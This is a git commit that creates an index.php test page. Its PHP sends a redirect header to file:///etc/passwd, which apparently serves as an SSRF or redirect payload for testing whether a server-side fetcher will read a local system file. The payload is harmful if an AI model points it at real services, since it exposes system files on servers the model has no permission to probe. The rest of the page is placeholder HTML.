61cc165037b681db3e4bc5461f282640722c21e7
yosif el saied qasim <93684533+yosif-qasim@users.noreply.github.com>
2024-06-20 22:45:01 +0300

    Create index.php

---
+++ index.php
@@ -0,0 +1,13 @@
+<?php
+     header('location:file:///etc/passwd');
+?>
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>website</title>
+  </head>
+        <h1>this is just a test html page</h1>
+  <body>
+  </body>
+</html>
